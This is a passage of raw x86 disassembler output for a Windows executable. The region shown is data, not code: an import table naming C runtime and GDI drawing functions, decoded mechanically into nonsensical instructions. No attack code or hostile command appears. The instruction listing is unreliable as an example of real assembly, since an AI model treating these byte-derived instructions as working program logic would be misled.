  412652:	add    DWORD PTR [eax],eax
  412654:	jp     0x412683
  412656:	add    DWORD PTR [eax],eax
  412658:	xchg   esi,eax
  412659:	sub    eax,0x2da60001
  41265e:	add    DWORD PTR [eax],eax
  412660:	mov    dh,0x2d
  412662:	add    DWORD PTR [eax],eax
  412664:	(bad)  
  412665:	sub    eax,0x2dd20001
  41266a:	add    DWORD PTR [eax],eax
  41266c:	loop   0x41269b
  41266e:	add    DWORD PTR [eax],eax
  412670:	hlt    
  412671:	sub    eax,0x2dfe0001
  412676:	add    DWORD PTR [eax],eax
  412678:	push   cs
  412679:	add    DWORD PTR cs:[eax],eax
  41267c:	push   ds
  41267d:	add    DWORD PTR cs:[eax],eax
  412680:	sub    BYTE PTR [esi],ch
  412682:	add    DWORD PTR [eax],eax
  412684:	add    BYTE PTR [eax],al
  412686:	add    BYTE PTR [eax],al
  412688:	dec    edx
  412689:	add    DWORD PTR cs:[eax],eax
  41268c:	add    BYTE PTR [eax],al
  41268e:	add    BYTE PTR [eax],al
  412690:	push   0x8000012e
  412695:	add    DWORD PTR cs:[eax],eax
  412698:	mov    WORD PTR [esi],gs
  41269a:	add    DWORD PTR [eax],eax
  41269c:	call   0x12e:0xb200012e
  4126a3:	add    dh,al
  4126a5:	add    DWORD PTR cs:[eax],eax
  4126a8:	fsubr  QWORD PTR [esi]
  4126aa:	add    DWORD PTR [eax],eax
  4126ac:	call   0xf84127df
  4126b1:	add    DWORD PTR cs:[eax],eax
  4126b4:	adc    BYTE PTR [edi],ch
  4126b6:	add    DWORD PTR [eax],eax
  4126b8:	push   ds
  4126b9:	das    
  4126ba:	add    DWORD PTR [eax],eax
  4126bc:	xor    BYTE PTR [edi],ch
  4126be:	add    DWORD PTR [eax],eax
  4126c0:	inc    eax
  4126c1:	das    
  4126c2:	add    DWORD PTR [eax],eax
  4126c4:	push   esi
  4126c5:	das    
  4126c6:	add    DWORD PTR [eax],eax
  4126c8:	data16 das 
  4126ca:	add    DWORD PTR [eax],eax
  4126cc:	jbe    0x4126fd
  4126ce:	add    DWORD PTR [eax],eax
  4126d0:	mov    ch,BYTE PTR [edi]
  4126d2:	add    DWORD PTR [eax],eax
  4126d4:	xchg   esi,eax
  4126d5:	das    
  4126d6:	add    DWORD PTR [eax],eax
  4126d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4126d9:	das    
  4126da:	add    DWORD PTR [eax],eax
  4126dc:	mov    dl,0x2f
  4126de:	add    DWORD PTR [eax],eax
  4126e0:	enter  0x12f,0x0
  4126e4:	loopne 0x412715
  4126e6:	add    DWORD PTR [eax],eax
  4126e8:	hlt    
  4126e9:	das    
  4126ea:	add    DWORD PTR [eax],eax
  4126ec:	add    dh,BYTE PTR [eax]
  4126ee:	add    DWORD PTR [eax],eax
  4126f0:	sbb    BYTE PTR [eax],dh
  4126f2:	add    DWORD PTR [eax],eax
  4126f4:	xor    BYTE PTR cs:[ecx],al
  4126f7:	add    BYTE PTR [edx],bh
  4126f9:	xor    BYTE PTR [ecx],al
  4126fb:	add    BYTE PTR [eax+0x30],cl
  4126fe:	add    DWORD PTR [eax],eax
  412700:	push   edx
  412701:	xor    BYTE PTR [ecx],al
  412703:	add    BYTE PTR [esi+0x30],ah
  412706:	add    DWORD PTR [eax],eax
  412708:	jbe    0x41273a
  41270a:	add    DWORD PTR [eax],eax
  41270c:	mov    dh,BYTE PTR [eax]
  41270e:	add    DWORD PTR [eax],eax
  412710:	pushf  
  412711:	xor    BYTE PTR [ecx],al
  412713:	add    BYTE PTR [eax-0x3bfffed0],dh
  412719:	xor    BYTE PTR [ecx],al
  41271b:	add    ah,dl
  41271d:	xor    BYTE PTR [ecx],al
  41271f:	add    dl,ch
  412721:	xor    BYTE PTR [ecx],al
  412723:	add    BYTE PTR [edx],al
  412725:	xor    DWORD PTR [ecx],eax
  412727:	add    BYTE PTR [edx],bl
  412729:	xor    DWORD PTR [ecx],eax
  41272b:	add    BYTE PTR [esi],ah
  41272d:	xor    DWORD PTR [ecx],eax
  41272f:	add    BYTE PTR [eax],bh
  412731:	xor    DWORD PTR [ecx],eax
  412733:	add    BYTE PTR [edx+0x31],cl
  412736:	add    DWORD PTR [eax],eax
  412738:	push   esi
  412739:	xor    DWORD PTR [ecx],eax
  41273b:	add    BYTE PTR [eax+0x31],ch
  41273e:	add    DWORD PTR [eax],eax
  412740:	jbe    0x412773
  412742:	add    DWORD PTR [eax],eax
  412744:	xor    BYTE PTR [ecx],0x1
  412747:	add    BYTE PTR [esi-0x59fffecf],dl
  41274d:	xor    DWORD PTR [ecx],eax
  41274f:	add    BYTE PTR [eax-0x2dfffecf],bh
  412755:	xor    DWORD PTR [ecx],eax
  412757:	add    dl,ch
  412759:	xor    DWORD PTR [ecx],eax
  41275b:	add    BYTE PTR [eax],al
  41275d:	add    BYTE PTR [eax],al
  41275f:	add    BYTE PTR [esi],al
  412761:	xor    al,BYTE PTR [ecx]
  412763:	add    BYTE PTR [edx+esi*1],bl
  412766:	add    DWORD PTR [eax],eax
  412768:	xor    dh,BYTE PTR [edx]
  41276a:	add    DWORD PTR [eax],eax
  41276c:	inc    edx
  41276d:	xor    al,BYTE PTR [ecx]
  41276f:	add    BYTE PTR [edx+0x32],dl
  412772:	add    DWORD PTR [eax],eax
  412774:	pusha  
  412775:	xor    al,BYTE PTR [ecx]
  412777:	add    BYTE PTR [eax+0x32],dh
  41277a:	add    DWORD PTR [eax],eax
  41277c:	test   BYTE PTR [edx],dh
  41277e:	add    DWORD PTR [eax],eax
  412780:	xchg   esp,eax
  412781:	xor    al,BYTE PTR [ecx]
  412783:	add    BYTE PTR [eax-0x41fffece],ch
  412789:	xor    al,BYTE PTR [ecx]
  41278b:	add    ah,cl
  41278d:	xor    al,BYTE PTR [ecx]
  41278f:	add    al,ah
  412791:	xor    al,BYTE PTR [ecx]
  412793:	add    al,dh
  412795:	xor    al,BYTE PTR [ecx]
  412797:	add    BYTE PTR [edx],al
  412799:	xor    eax,DWORD PTR [ecx]
  41279b:	add    BYTE PTR [edx],bl
  41279d:	xor    eax,DWORD PTR [ecx]
  41279f:	add    BYTE PTR [esi],ah
  4127a1:	xor    eax,DWORD PTR [ecx]
  4127a3:	add    BYTE PTR [ebx+esi*1],dh
  4127a6:	add    DWORD PTR [eax],eax
  4127a8:	inc    esp
  4127a9:	xor    eax,DWORD PTR [ecx]
  4127ab:	add    BYTE PTR [edx+0x33],dl
  4127ae:	add    DWORD PTR [eax],eax
  4127b0:	push   0x7a000133
  4127b5:	xor    eax,DWORD PTR [ecx]
  4127b7:	add    BYTE PTR [esi-0x6bfffecd],al
  4127bd:	xor    eax,DWORD PTR [ecx]
  4127bf:	add    BYTE PTR [esi-0x4bfffecd],ah
  4127c5:	xor    eax,DWORD PTR [ecx]
  4127c7:	add    dh,al
  4127c9:	xor    eax,DWORD PTR [ecx]
  4127cb:	add    al,bl
  4127cd:	xor    eax,DWORD PTR [ecx]
  4127cf:	add    dl,ch
  4127d1:	xor    eax,DWORD PTR [ecx]
  4127d3:	add    dl,bh
  4127d5:	xor    eax,DWORD PTR [ecx]
  4127d7:	add    BYTE PTR [esi],al
  4127d9:	xor    al,0x1
  4127db:	add    BYTE PTR [esp+esi*1],bl
  4127de:	add    DWORD PTR [eax],eax
  4127e0:	cmp    BYTE PTR [ecx+eax*1],dh
  4127e3:	add    BYTE PTR [edx+0x34],dl
  4127e6:	add    DWORD PTR [eax],eax
  4127e8:	data16 xor al,0x1
  4127eb:	add    BYTE PTR [esp+esi*1+0x1],dh
  4127ef:	add    BYTE PTR [eax-0x6dfffecc],al
  4127f5:	xor    al,0x1
  4127f7:	add    BYTE PTR [edx-0x51fffecc],ah
  4127fd:	xor    al,0x1
  4127ff:	add    BYTE PTR [edx-0x37fffecc],bh
  412805:	xor    al,0x1
  412807:	add    al,ah
  412809:	xor    al,0x1
  41280b:	add    al,dh
  41280d:	xor    al,0x1
  41280f:	add    BYTE PTR [eax],cl
  412811:	xor    eax,0x351a0001
  412816:	add    DWORD PTR [eax],eax
  412818:	sub    dh,BYTE PTR ds:0x35380001
  41281e:	add    DWORD PTR [eax],eax
  412820:	dec    edx
  412821:	xor    eax,0x35580001
  412826:	add    DWORD PTR [eax],eax
  412828:	fs xor eax,0x35720001
  41282e:	add    DWORD PTR [eax],eax
  412830:	jl     0x412867
  412832:	add    DWORD PTR [eax],eax
  412834:	xchg   esp,eax
  412835:	xor    eax,0x35a40001
  41283a:	add    DWORD PTR [eax],eax
  41283c:	mov    ah,0x35
  41283e:	add    DWORD PTR [eax],eax
  412840:	ret    0x135
  412843:	add    al,dl
  412845:	xor    eax,0x35e00001
  41284a:	add    DWORD PTR [eax],eax
  41284c:	div    BYTE PTR ds:0x36080001
  412852:	add    DWORD PTR [eax],eax
  412854:	push   ss
  412855:	add    DWORD PTR ss:[eax],eax
  412858:	sub    al,0x36
  41285a:	add    DWORD PTR [eax],eax
  41285c:	cmp    dh,BYTE PTR [esi]
  41285e:	add    DWORD PTR [eax],eax
  412860:	push   edx
  412861:	add    DWORD PTR ss:[eax],eax
  412864:	pop    esi
  412865:	add    DWORD PTR ss:[eax],eax
  412868:	push   0x36
  41286a:	add    DWORD PTR [eax],eax
  41286c:	jbe    0x4128a4
  41286e:	add    DWORD PTR [eax],eax
  412870:	test   BYTE PTR [esi],dh
  412872:	add    DWORD PTR [eax],eax
  412874:	xchg   esi,eax
  412875:	add    DWORD PTR ss:[eax],eax
  412878:	mov    ds:0xb4000136,al
  41287d:	add    DWORD PTR ss:[eax],eax
  412880:	shl    BYTE PTR [esi],0x1
  412883:	add    dh,cl
  412885:	add    DWORD PTR ss:[eax],eax
  412888:	fdiv   QWORD PTR [esi]
  41288a:	add    DWORD PTR [eax],eax
  41288c:	call   0xf64129c7
  412891:	add    DWORD PTR ss:[eax],eax
  412894:	add    al,0x37
  412896:	add    DWORD PTR [eax],eax
  412898:	adc    al,0x37
  41289a:	add    DWORD PTR [eax],eax
  41289c:	es aaa 
  41289e:	add    DWORD PTR [eax],eax
  4128a0:	cmp    al,0x37
  4128a2:	add    DWORD PTR [eax],eax
  4128a4:	inc    esi
  4128a5:	aaa    
  4128a6:	add    DWORD PTR [eax],eax
  4128a8:	push   esp
  4128a9:	aaa    
  4128aa:	add    DWORD PTR [eax],eax
  4128ac:	fs aaa 
  4128ae:	add    DWORD PTR [eax],eax
  4128b0:	jbe    0x4128e9
  4128b2:	add    DWORD PTR [eax],eax
  4128b4:	test   BYTE PTR [edi],dh
  4128b6:	add    DWORD PTR [eax],eax
  4128b8:	cwde   
  4128b9:	aaa    
  4128ba:	add    DWORD PTR [eax],eax
  4128bc:	mov    dl,0x37
  4128be:	add    DWORD PTR [eax],eax
  4128c0:	les    esi,FWORD PTR [edi]
  4128c2:	add    DWORD PTR [eax],eax
  4128c4:	aam    0x37
  4128c6:	add    DWORD PTR [eax],eax
  4128c8:	call   0xfa412a04
  4128cd:	aaa    
  4128ce:	add    DWORD PTR [eax],eax
  4128d0:	or     bh,BYTE PTR [eax]
  4128d2:	add    DWORD PTR [eax],eax
  4128d4:	push   ss
  4128d5:	cmp    BYTE PTR [ecx],al
  4128d7:	add    BYTE PTR [eax+edi*1],dh
  4128da:	add    DWORD PTR [eax],eax
  4128dc:	inc    esi
  4128dd:	cmp    BYTE PTR [ecx],al
  4128df:	add    BYTE PTR [eax+edi*1+0x1],bl
  4128e3:	add    BYTE PTR [eax+0x38],bh
  4128e6:	add    DWORD PTR [eax],eax
  4128e8:	nop
  4128e9:	cmp    BYTE PTR [ecx],al
  4128eb:	add    BYTE PTR [eax+edi*1+0x38b00001],bl
  4128f2:	add    DWORD PTR [eax],eax
  4128f4:	mov    edx,0xc8000138
  4128f9:	cmp    BYTE PTR [ecx],al
  4128fb:	add    ah,ah
  4128fd:	cmp    BYTE PTR [ecx],al
  4128ff:	add    dl,dh
  412901:	cmp    BYTE PTR [ecx],al
  412903:	add    BYTE PTR [esi],al
  412905:	cmp    DWORD PTR [ecx],eax
  412907:	add    BYTE PTR [eax],bl
  412909:	cmp    DWORD PTR [ecx],eax
  41290b:	add    BYTE PTR [edx],ch
  41290d:	cmp    DWORD PTR [ecx],eax
  41290f:	add    BYTE PTR [edx],bh
  412911:	cmp    DWORD PTR [ecx],eax
  412913:	add    BYTE PTR [eax+0x39],dl
  412916:	add    DWORD PTR [eax],eax
  412918:	cmp    WORD PTR [ecx],ax
  41291b:	add    BYTE PTR [eax],al
  41291d:	add    BYTE PTR [eax],al
  41291f:	add    al,ch
  412921:	add    esi,DWORD PTR [ebx+0x74]
  412924:	jb     0x412989
  412926:	jo     0x4129a1
  412928:	add    BYTE PTR [eax],al
  41292a:	or     eax,0x676e7504
  41292f:	gs je  0x412995
  412932:	add    BYTE PTR [eax],al
  412934:	pop    edi
  412935:	add    esp,DWORD PTR [ebx+0x6c]
  412938:	gs popa 
  41293a:	jb     0x4129a1
  41293c:	jb     0x4129b0
  41293e:	add    BYTE PTR [eax],al
  412940:	sub    BYTE PTR [edi+esi*2],al
  412943:	arpl   WORD PTR [ebx+0x6e],si
  412946:	arpl   WORD PTR [ebp+0x70],bp
  412949:	add    ch,dh
  41294b:	add    BYTE PTR [edi+0x63],bl
  41294e:	outs   dx,DWORD PTR ds:[esi]
  41294f:	outs   dx,BYTE PTR ds:[esi]
  412950:	je     0x4129c4
  412952:	outs   dx,DWORD PTR ds:[esi]
  412953:	ins    BYTE PTR es:[edi],dx
  412954:	data16 jo 0x412957
  412957:	add    BYTE PTR [ebp+0x6c616d03],dh
  41295d:	ins    BYTE PTR es:[edi],dx
  41295e:	outs   dx,DWORD PTR ds:[esi]
  41295f:	arpl   WORD PTR [eax],ax
  412961:	add    BYTE PTR [ebx+0x735f5f00],dh
  412967:	gs je  0x4129c9
  41296a:	popa   
  41296b:	jo     0x4129dd
  41296d:	pop    edi
  41296e:	je     0x4129e9
  412970:	jo     0x4129d7
  412972:	add    BYTE PTR [eax],al
  412974:	add    eax,DWORD PTR [ebx+esi*2]
  412977:	jns    0x4129ec
  412979:	je     0x4129e0
  41297b:	ins    DWORD PTR es:[edi],dx
  41297c:	add    BYTE PTR [eax],al
  41297e:	mov    al,ds:0x705f5f00
  412983:	pop    edi
  412984:	pop    edi
  412985:	ins    WORD PTR es:[edi],dx
  412987:	outs   dx,DWORD PTR ds:[esi]
  412988:	fs add BYTE PTR gs:[eax],al
  41298c:	pop    ebp
  41298d:	add    esp,DWORD PTR [ebx+0x61]
  412990:	ins    BYTE PTR es:[edi],dx
  412991:	ins    BYTE PTR es:[edi],dx
  412992:	outs   dx,DWORD PTR ds:[esi]
  412993:	arpl   WORD PTR [eax],ax
  412995:	add    BYTE PTR [ebx+0x705f5f00],bl
  41299b:	pop    edi
  41299c:	pop    edi
  41299d:	arpl   WORD PTR [edi+0x6d],bp
  4129a0:	ins    DWORD PTR es:[edi],dx
  4129a1:	outs   dx,DWORD PTR ds:[esi]
  4129a2:	fs add BYTE PTR gs:[eax],al
  4129a6:	std    
  4129a7:	add    esi,DWORD PTR [ebx+0x74]
  4129aa:	jb     0x412a20
  4129ac:	outs   dx,DWORD PTR ds:[esi]
  4129ad:	jne    0x412a1b
  4129af:	add    BYTE PTR [esi],dl
  4129b1:	add    al,0x76
  4129b3:	jae    0x412a25
  4129b5:	jb     0x412a20
  4129b7:	outs   dx,BYTE PTR ds:[esi]
  4129b8:	je     0x412a20
  4129ba:	add    BYTE PTR [eax],al
  4129bc:	sub    al,0x4
  4129be:	ja     0x412a23
  4129c0:	jae    0x412a32
  4129c2:	bound  esi,QWORD PTR [edx+0x6b]
  4129c5:	add    bl,bl
  4129c7:	add    BYTE PTR [edi+0x61],bl
  4129ca:	ins    DWORD PTR es:[edi],dx
  4129cb:	jae    0x412a34
  4129cd:	pop    edi
  4129ce:	gs js  0x412a3a
  4129d1:	je     0x4129d3
  4129d3:	add    BYTE PTR [esi+0x6e695f01],al
  4129d9:	imul   esi,DWORD PTR [esp+esi*2+0x65],0x94006d72
  4129e1:	add    ebp,DWORD PTR [ecx+0x73]
  4129e4:	popa   
  4129e5:	ins    BYTE PTR es:[edi],dx
  4129e6:	outs   dx,BYTE PTR ds:[esi]
  4129e7:	jne    0x412a56
  4129e9:	add    BYTE PTR [ebp+0x3],ch
  4129ec:	data16 addr16 gs je 0x412a54
  4129f1:	add    BYTE PTR [esi+0x73695f01],bl
  4129f7:	ins    DWORD PTR es:[edi],dx
  4129f8:	bound  esp,QWORD PTR [edx+0x6c]
  4129fb:	gs popa 
  4129fd:	add    BYTE PTR fs:[eax],al
  412a00:	pop    ebx
  412a01:	add    esp,DWORD PTR [edx+0x73]
  412a04:	gs popa 
  412a06:	jb     0x412a6b
  412a08:	push   0x7303e500
  412a0d:	je     0x412a81
  412a0f:	arpl   WORD PTR [eax+0x72],bp
  412a12:	add    BYTE PTR [eax],al
  412a14:	push   edx
  412a15:	add    BYTE PTR [edi+0x58],bl
  412a18:	arpl   WORD PTR [eax+0x74],si
  412a1b:	inc    esi
  412a1c:	imul   ebp,DWORD PTR [esp+esi*2+0x65],0x3e70072
  412a24:	jae    0x412a9a
  412a26:	jb     0x412a8b
  412a28:	outs   dx,DWORD PTR ds:[esi]
  412a29:	ins    BYTE PTR es:[edi],dx
  412a2a:	ins    BYTE PTR es:[edi],dx
  412a2b:	add    BYTE PTR [esi],al
  412a2d:	add    al,0x74
  412a2f:	imul   ebp,DWORD PTR [ebp+0x65],0x3b10000
  412a36:	ins    BYTE PTR es:[edi],dx
  412a37:	outs   dx,DWORD PTR ds:[esi]
  412a38:	arpl   WORD PTR [ecx+0x6c],sp
  412a3b:	je     0x412aa6
  412a3d:	ins    DWORD PTR es:[edi],dx
  412a3e:	add    BYTE PTR gs:[eax],bh
  412a41:	add    al,0x77
  412a43:	arpl   WORD PTR [ebx+0x74],si
  412a46:	outs   dx,DWORD PTR ds:[esi]
  412a47:	jne    0x412ab5
  412a49:	add    BYTE PTR [ecx],ah
  412a4b:	add    al,0x77
  412a4d:	arpl   WORD PTR [ebx+0x63],si
  412a50:	jo     0x412acb
  412a52:	add    BYTE PTR [eax],al
  412a54:	enter  0x7003,0x75
  412a58:	je     0x412abd
  412a5a:	push   0x78007261
  412a5f:	add    esp,DWORD PTR [esi+0x70]
  412a62:	jne    0x412ad8
  412a64:	arpl   WORD PTR [eax],ax
  412a66:	sbb    al,0x4
  412a68:	ja     0x412acd
  412a6a:	jae    0x412acf
  412a6c:	popa   
  412a6d:	je     0x412a6f
  412a6f:	add    dl,ch
  412a71:	add    esi,DWORD PTR [ebx+0x74]
  412a74:	jb     0x412ad9
  412a76:	jae    0x412ae8
  412a78:	outs   dx,BYTE PTR ds:[esi]
  412a79:	add    BYTE PTR [ebx+0x65736603],al
  412a7f:	imul   eax,DWORD PTR gs:[eax],0xffffffb7
  412a83:	add    ebp,DWORD PTR [ebp+0x62]
  412a86:	jae    0x412afc
  412a88:	outs   dx,DWORD PTR ds:[esi]
  412a89:	ja     0x412aee
  412a8b:	jae    0x412a8d
  412a8d:	add    BYTE PTR [ebx],cl
  412a8f:	add    al,0x74
  412a91:	outs   dx,DWORD PTR ds:[esi]
  412a92:	ja     0x412b00
  412a94:	outs   dx,DWORD PTR ds:[esi]
  412a95:	ja     0x412afc
  412a97:	jb     0x412a99
  412a99:	add    ah,cl
  412a9b:	add    esi,DWORD PTR [ecx+0x73]
  412a9e:	outs   dx,DWORD PTR ds:[esi]
  412a9f:	jb     0x412b15
  412aa1:	add    BYTE PTR [ecx],al
  412aa3:	add    al,0x73
  412aa5:	ja     0x412b1a
  412aa7:	arpl   WORD PTR [ecx+0x6e],sp
  412aaa:	data16 add BYTE PTR [ebx],ah
  412aad:	add    DWORD PTR [edi+0x65],ebx
  412ab0:	js     0x412b1b
  412ab2:	je     0x412ab4
  412ab4:	ss add al,0x77
  412ab7:	arpl   WORD PTR [ebx+0x74],si
  412aba:	outs   dx,DWORD PTR ds:[esi]
  412abb:	ins    DWORD PTR es:[edi],dx
  412abc:	bound  esi,QWORD PTR [ebx+0x0]
  412abf:	add    al,ch
  412ac1:	add    BYTE PTR [edi+0x63],bl
  412ac4:	gs js  0x412b30
  412ac7:	je     0x412ac9
  412ac9:	add    BYTE PTR [ecx],ch
  412acb:	add    al,0x77
  412acd:	arpl   WORD PTR [ebx+0x6e],si
  412ad0:	arpl   WORD PTR [eax+0x79],si
  412ad3:	add    BYTE PTR [ebx+0x70736903],bl
  412ad9:	jb     0x412b44
  412adb:	outs   dx,BYTE PTR ds:[esi]
  412adc:	je     0x412ade
  412ade:	mov    ch,0x0
  412ae0:	pop    edi
  412ae1:	pop    edi
  412ae2:	jae    0x412b49
  412ae4:	je     0x412b5b
  412ae6:	jae    0x412b4d
  412ae8:	jb     0x412b57
  412aea:	popa   
  412aeb:	je     0x412b55
  412aed:	gs jb  0x412b62
  412af0:	add    BYTE PTR [eax],al
  412af2:	sbb    BYTE PTR [esi+esi*2],al
  412af5:	jae    0x412b6e
  412af7:	jo     0x412b6b
  412af9:	imul   ebp,DWORD PTR [esi+0x74],0x720066
  412b00:	pop    edi
  412b01:	pop    edi
  412b02:	addr16 gs je 0x412b73
  412b06:	popa   
  412b07:	imul   ebp,DWORD PTR [esi+0x61],0x736772
  412b0e:	dec    ebp
  412b0f:	push   ebx
  412b10:	push   esi
  412b11:	inc    ebx
  412b12:	push   edx
  412b13:	push   esp
  412b14:	cs fs ins BYTE PTR es:[edi],dx
  412b17:	ins    BYTE PTR es:[edi],dx
  412b18:	add    BYTE PTR [eax],al
  412b1a:	fadd   QWORD PTR [ecx]
  412b1c:	push   ebx
  412b1d:	gs je  0x412b64
  412b20:	dec    ecx
  412b21:	inc    edx
  412b22:	inc    ebx
  412b23:	outs   dx,DWORD PTR ds:[esi]
  412b24:	ins    BYTE PTR es:[edi],dx
  412b25:	outs   dx,DWORD PTR ds:[esi]
  412b26:	jb     0x412b7c
  412b28:	popa   
  412b29:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  412b2d:	add    bh,dl
  412b2f:	add    DWORD PTR [ebx+0x65],edx
  412b32:	je     0x412b76
  412b34:	jb     0x412bab
  412b36:	jae    0x412ba0
  412b38:	dec    edi
  412b39:	jb     0x412ba2
  412b3b:	inc    ebp
  412b3c:	js     0x412b3e
  412b3e:	add    DWORD PTR [eax],0x626d6f43
  412b44:	imul   ebp,DWORD PTR [esi+0x65],0x6e6752
  412b4b:	add    BYTE PTR [ecx+eax*1],ah
  412b4e:	inc    edi
  412b4f:	gs je  0x412b94
  412b52:	imul   ecx,DWORD PTR [ebp+0x6f],0x64
  412b56:	gs add bh,cl
  412b59:	add    DWORD PTR [ebx+0x65],edx
  412b5c:	ins    BYTE PTR es:[edi],dx
  412b5d:	arpl   WORD PTR gs:[eax+edx*2+0x61],si
  412b62:	ins    BYTE PTR es:[edi],dx
  412b63:	gs je  0x412bda
  412b66:	add    BYTE PTR gs:[ecx+0x65724300],cl
  412b6d:	popa   
  412b6e:	je     0x412bd5
  412b70:	inc    edx
  412b71:	jb     0x412be8
  412b73:	jae    0x412bdd
  412b75:	dec    ecx
  412b76:	outs   dx,BYTE PTR ds:[esi]
  412b77:	imul   esi,DWORD PTR fs:[edx+0x65],0xaa007463
  412b7f:	add    BYTE PTR [ebx+0x72],al
  412b82:	gs popa 
  412b84:	je     0x412beb
  412b86:	push   eax
  412b87:	outs   dx,DWORD PTR ds:[esi]
  412b88:	ins    BYTE PTR es:[edi],dx
  412b89:	jns    0x412bf2
  412b8b:	outs   dx,DWORD PTR ds:[esi]
  412b8c:	outs   dx,BYTE PTR ds:[esi]
  412b8d:	push   edx
  412b8e:	outs   dx,BYTE PTR ds:[si]
  412b90:	add    BYTE PTR [eax],al
  412b92:	mov    al,ds:0x65724300
  412b97:	popa   
  412b98:	je     0x412bff
  412b9a:	dec    eax
  412b9b:	popa   
  412b9c:	je     0x412c01
  412b9e:	push   0x73757242
  412ba3:	push   0x17a0000
  412ba8:	inc    edi
  412ba9:	gs je  0x412bff
  412bac:	jns    0x412c21
  412bae:	je     0x412c15
  412bb0:	ins    DWORD PTR es:[edi],dx
  412bb1:	push   eax
  412bb2:	popa   
  412bb3:	ins    BYTE PTR es:[edi],dx
  412bb4:	gs je  0x412c2b
  412bb7:	gs push ebp
  412bb9:	jae    0x412c20
  412bbb:	add    BYTE PTR [esi+0x65724300],bl
  412bc1:	popa   
  412bc2:	je     0x412c29
  412bc4:	inc    esi
  412bc5:	outs   dx,DWORD PTR ds:[esi]
  412bc6:	outs   dx,BYTE PTR ds:[esi]
  412bc7:	je     0x412c20
  412bc9:	add    BYTE PTR [ebp+0x65724300],bl
  412bcf:	popa   
  412bd0:	je     0x412c37
  412bd2:	inc    esi
  412bd3:	outs   dx,DWORD PTR ds:[esi]
  412bd4:	outs   dx,BYTE PTR ds:[esi]
  412bd5:	je     0x412c20
  412bd7:	outs   dx,BYTE PTR ds:[esi]
  412bd8:	imul   esi,DWORD PTR fs:[edx+0x65],0x577463
  412be0:	mov    ah,0x1
  412be2:	push   eax
  412be3:	outs   dx,DWORD PTR ds:[esi]
  412be4:	ins    BYTE PTR es:[edi],dx
  412be5:	jns    0x412c53
  412be7:	imul   ebp,DWORD PTR [esi+0x65],0x18a0000
  412bee:	inc    edi
  412bef:	gs je  0x412c46
  412bf2:	gs js  0x412c69
  412bf5:	dec    ebp
  412bf6:	gs je  0x412c6b
  412bf9:	imul   esp,DWORD PTR [ebx+0x73],0x20d0041
  412c00:	push   esp
  412c01:	jb     0x412c64
  412c03:	outs   dx,BYTE PTR ds:[esi]
  412c04:	jae    0x412c72
  412c06:	popa   
  412c07:	je     0x412c6e
  412c09:	inc    ebx
  412c0a:	push   0x65737261
  412c0f:	je     0x412c5a
  412c11:	outs   dx,BYTE PTR ds:[esi]
  412c12:	outs   dx,WORD PTR ds:[esi]
  412c14:	add    BYTE PTR [eax],al
  412c16:	lar    edx,WORD PTR [ebp+0x6e]
  412c1a:	jb     0x412c81
  412c1c:	popa   
  412c1d:	ins    BYTE PTR es:[edi],dx
  412c1e:	imul   edi,DWORD PTR [edx+0x65],0x656a624f
  412c25:	arpl   WORD PTR [eax+eax*1+0x41],si
  412c29:	add    DWORD PTR [edi+0x65],eax
  412c2c:	je     0x412c72
  412c2e:	gs jbe 0x412c9a
  412c31:	arpl   WORD PTR [ebp+0x43],sp
  412c34:	popa   
  412c35:	jo     0x412caa
  412c37:	add    BYTE PTR [ecx+0x1],dh
  412c3a:	inc    edi
  412c3b:	gs je  0x412c90
  412c3e:	dec    edi
  412c3f:	push   eax
  412c40:	xor    al,BYTE PTR [eax]
  412c42:	les    eax,FWORD PTR [eax]
  412c44:	inc    ebp
  412c45:	outs   dx,BYTE PTR ds:[esi]
  412c46:	jne    0x412cb5
  412c48:	inc    esi
  412c49:	outs   dx,DWORD PTR ds:[esi]
  412c4a:	outs   dx,BYTE PTR ds:[esi]
  412c4b:	je     0x412c93
  412c4d:	popa   
  412c4e:	ins    DWORD PTR es:[edi],dx
  412c4f:	imul   ebp,DWORD PTR [ecx+ebp*2+0x65],0x57784573
  412c57:	add    BYTE PTR [eax+eax*1+0x61657243],dl
  412c5e:	je     0x412cc5
  412c60:	inc    esp
  412c61:	imul   esi,DWORD PTR [ebx+0x63],0x61647261
  412c68:	bound  ebp,QWORD PTR [ebp+eiz*2+0x42]
  412c6c:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x1dd0070
  412c74:	push   ebx
  412c75:	gs je  0x412cbc
  412c78:	dec    ecx
  412c79:	inc    edx
  412c7a:	imul   esi,DWORD PTR [ebx+esi*2+0x0],0x654400b3
  412c82:	ins    BYTE PTR es:[edi],dx
  412c83:	gs je  0x412ceb
  412c86:	inc    esp
  412c87:	inc    ebx
  412c88:	add    BYTE PTR [eax],al
  412c8a:	mov    es,WORD PTR [ecx]
  412c8c:	inc    edi
  412c8d:	gs je  0x412ce6
  412c90:	imul   esp,DWORD PTR [ebp+0x77],0x74726f70
  412c97:	dec    edi
  412c98:	jb     0x412d01
  412c9a:	inc    ebp
  412c9b:	js     0x412c9d
  412c9d:	add    BYTE PTR [ecx+0x1],bh
  412ca0:	inc    edi
  412ca1:	gs je  0x412cf7
  412ca4:	jns    0x412d19
  412ca6:	je     0x412d0d
  412ca8:	ins    DWORD PTR es:[edi],dx
  412ca9:	push   eax
  412caa:	popa   
  412cab:	ins    BYTE PTR es:[edi],dx
  412cac:	gs je  0x412d23
  412caf:	gs inc ebp
  412cb1:	outs   dx,BYTE PTR ds:[esi]
  412cb2:	je     0x412d26
  412cb4:	imul   esp,DWORD PTR [ebp+0x73],0x57021400
  412cbb:	imul   esp,DWORD PTR [ebp+eiz*2+0x6e],0x68746150
  412cc3:	add    BYTE PTR [edi+0x1],ah
  412cc6:	inc    edi
  412cc7:	gs je  0x412d19
  412cca:	bound  ebp,QWORD PTR [edx+0x65]
  412ccd:	arpl   WORD PTR [ecx+eax*2+0x0],si
  412cd1:	add    BYTE PTR [ebx+0x74654701],cl
  412cd7:	push   esp
  412cd8:	gs js  0x412d4f
  412cdb:	dec    ebp
  412cdc:	gs je  0x412d51
  412cdf:	imul   esp,DWORD PTR [ebx+0x73],0x16e0057
  412ce6:	inc    edi
  412ce7:	gs je  0x412d3a
  412cea:	imul   edi,DWORD PTR [eax+0x65],0xc100006c
  412cf1:	add    DWORD PTR [edx+0x65],edx
  412cf4:	ins    DWORD PTR es:[edi],dx
  412cf5:	outs   dx,DWORD PTR ds:[esi]
  412cf6:	jbe    0x412d5d
  412cf8:	inc    esi
  412cf9:	outs   dx,DWORD PTR ds:[esi]
  412cfa:	outs   dx,BYTE PTR ds:[esi]
  412cfb:	je     0x412d4f
